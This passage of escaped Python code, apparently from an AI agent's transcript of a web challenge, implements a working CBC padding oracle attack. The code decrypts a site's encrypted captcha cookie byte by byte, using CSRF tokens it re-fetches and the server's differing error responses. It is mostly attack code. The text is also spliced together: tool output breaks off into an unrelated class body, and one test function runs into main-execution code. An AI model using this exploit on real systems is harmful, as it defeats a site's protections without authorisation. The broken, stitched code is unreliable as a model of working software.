(len(sig_part) % 4)\n            if padding_needed != 4:\n                sig_part += '=' * padding_needed\n            \n            try:\n                decoded_sig = base64.b64decode(sig_part)\n                print(f\"Signature is {len(decoded_sig)} bytes\")\n            except Exception as e:\n                print(f\"Signature decode error: {e}\")\n\n\n# Main execution\nif __name__ == \"__main__\":\n    test_registration_with_extracted_fields()\n    analyze_token_format()\n    \n    print(\"\\n=== SUMMARY ===\")\n    print(\"Check if captcha cookie validation is separate from CSRF validation.\")\n    print(\"If we can get different errors for captcha vs CSRF, we can test padding oracle.\")\n{\n\u2502   'stdout': '=== TESTING REGISTRATION WITH EXACT FORM FIELDS ====== EXTRACTING COMPLETE FORM DETAILS ===[GET /] Status: 200Form HTML extracted (length: 21146)Found 4 input fields:  [0] csrf_token: IjU3YzcwYTY4NGQ0YzQ4M2ZkODMwM2JiZjA1NTM4NTIyNzAzNz... AES block size\n    \n    def test_ciphertext(self, ciphertext_b64):\n        \"\"\"Test a ciphertext and return the response indicator\"\"\"\n        cookies = {\n            'session': self.session_cookie,\n            'captcha': ciphertext_b64\n        }\n        \n        # We need to also provide a username since it's a required field\n        # but we can leave captcha field empty to trigger decryption error\n        form_data = {\n            'username': 'test',\n            'captcha': '',  # Empty captcha text will fail validation\n            # CSRF token will be added from fresh GET request\n        }\n        \n        # Get fresh CSRF token for each request\n        try:\n            get_response = self.session.get(self.base_url)\n            csrf_match = re.search(r'name=\"csrf_token\"[^>]*value=\"([^\"]+)\"', get_response.text)\n            if csrf_match:\n                form_data['csrf_token'] = csrf_match.group(1)\n            else:\n                form_data['csrf_token'] = ''\n        except:\n            form_data['csrf_token'] = ''\n        \n        response = requests.post(self.base_url + '/', data=form_data, cookies=cookies, allow_redirects=False)\n        return response.status_code, response.text\n    \n    def is_padding_valid(self, status_code, response_text):\n        \"\"\"Check if padding is valid (returns different error than invalid padding)\"\"\"\n        # Valid padding should give \"Invalid CAPTCHA!\" (decryption worked but text doesn't match)\n        # Invalid padding should give 500 error (decryption failed)\n        return status_code == 403 and \"Invalid CAPTCHA!\" in response_text\n    \n    def decrypt_block(self, ciphertext, block_index):\n        \"\"\"Decrypt a single block using padding oracle\"\"\"\n        print(f\"\\n=== Decrypting Block {block_index} ===\")\n        \n        # Split ciphertext into blocks\n        ct_bytes = base64.b64decode(ciphertext)\n        blocks = [ct_bytes[i:i+self.block_size] for i in range(0, len(ct_bytes), self.block_size)]\n        \n        if block_index >= len(blocks):\n            print(f\"Block index {block_index} out of range (only {len(blocks)} blocks)\")\n            return None\n        \n        # For padding oracle, we need previous block as IV for current block\n        if block_index == 0:\n            print(\"Cannot decrypt first block without IV\")\n            return None\n        \n        target_block = blocks[block_index]\n        prev_block = blocks[block_index - 1]\n        \n        decrypted = bytearray(self.block_size)\n        \n        # Work backwards from last byte to first\n        for byte_pos in range(self.block_size - 1, -1, -1):\n            print(f\"  Decrypting byte {byte_pos}...\")\n            \n            found = False\n            for guess in range(256):\n                # Create modified previous block\n                modified_prev = bytearray(prev_block)\n                \n                # Set up padding: for position byte_pos, we need padding value = (block_size - byte_pos)\n                padding_value = self.block_size - byte_pos\n                \n                # XOR previous block bytes with known decrypted bytes and padding\n                for i in range(byte_pos + 1, self.block_size):\n                    modified_prev[i] = prev_block[i] ^ decrypted[i] ^ padding_value\n                \n                # Try current guess\n                modified_prev[byte_pos] = prev_block[byte_pos] ^ guess ^ padding_value\n                \n                # Reconstruct ciphertext with modified block\n                test_ct = b''.join(\n                    blocks[:block_index - 1] + \n                    [bytes(modified_prev), target_block] + \n                    blocks[block_index + 1:]\n                )\n                \n                test_ct_b64 = base64.b64encode(test_ct).decode('ascii')\n                \n                # Test padding\n                status, text = self.test_ciphertext(test_ct_b64)\n                \n                if self.is_padding_valid(status, text):\n                    decrypted[byte_pos] = guess\n                    print(f\"    Found byte {byte_pos}: {hex(guess)} ('{chr(guess) if 32 <= guess < 127 else '.'}')\")\n                    found = True\n                    break\n            \n            if not found:\n                print(f\"  [!] Could not decrypt byte {byte_pos}\")\n                return None\n        \n        return bytes(decrypted)\n    \n    def decrypt_captcha(self, ciphertext_b64):\n        \"\"\"Decrypt the full captcha ciphertext\"\"\"\n        print(f\"Starting padding oracle attack on captcha cookie\")\n        print(f\"Ciphertext: {ciphertext_b64}\")\n        print(f\"Block size: {self.block_size} bytes\")\n        \n        ct_bytes = base64.b64decode(ciphertext_b64)\n        print(f\"Total ciphertext length: {len(ct_bytes)} bytes\")\n        print(f\"Number of blocks: {len(ct_bytes) // self.block_size}\")\n        \n        blocks = [ct_bytes[i:i+self.block_size] for i in range(0, len(ct_bytes), self.block_size)]\n        \n        decrypted_bytes = b''\n        \n        # Decrypt from last block to first (skip IV if it exists)\n        for i in range(len(blocks) - 1, 0, -1):\n            print(f\"\\n--- Processing Block {i} ---\")\n            decrypted_block = self.decrypt_block(ciphertext_b64, i)\n            \n            if decrypted_block:\n                decrypted_bytes = decrypted_block + decrypted_bytes\n                print(f\"Block {i} decrypted: {decrypted_block.hex()} ({len(decrypted_block)} bytes)\")\n            else:\n                print(f\"Failed to decrypt block {i}\")\n                break\n        \n        return decrypted_bytes\n\n\ndef test_oracle_behavior():\n    \"\"\"Test different ciphertexts to understand the oracle\"\"\"\n    print(\"=== TESTING PADDING ORACLE BEHAVIOR ===\")\n    \n    solver = PaddingOracleSolver(BASE_URL, session_cookie)\n    \n    # Test with valid captcha cookie\n    print(\"\\n1. Testing valid captcha cookie:\")\n    status1, text1 = solver.test_ciphertext(captcha_cookie)\n    print(f\"Status: {status1}, Response: {text1[:100]}\")\n    print(f\"Padding valid: {solver.is_padding_valid(status1, text1)}\")\n    \n    # Test with invalid base64\n    print(\"\\n2. Testing invalid base64:\")\n    status2, text2 = solver.test_ciphertext(\"invalid_b64!!!\")\n    print(f\"Status: {status2}, Response: {text2[:100]}\")\n    print(f\"Padding valid: {solver.is_padding_valid(status2, text2)}\")\n    \n    # Test with truncated valid base64\n    print(\"\\n3. Testing truncated ciphertext:\")\n    truncated = captcha_cookie[:-4]\n    status3, text3 = solver.test_ciphertext(truncated)\n    print(f\"Status: {status3}, Response: {text3[:100]}\")\n    print(f\"Padding valid: {solver.is_padding_valid(status3, text3)}\")\n    \n    # Test with modified ciphertext (bit flip)\n    print(\"\\n4. Captcha Decryption\")\n    print(\"=\" * 50)\n    print(f\"Target: {BASE_URL}\")\n    print(f\"Captcha cookie: {captcha_cookie[:40]}...\")\n    \n    # First test the oracle behavior\n    test_oracle_behavior()\n    \n    # If oracle looks promising, attempt decryption\n    print(\"\\n=== ATTEMPTING CAPTCHA DECRYPTION ===\")\n    solver = PaddingOracleSolver(BASE_URL, session_cookie)\n    \n    # This is simplified -
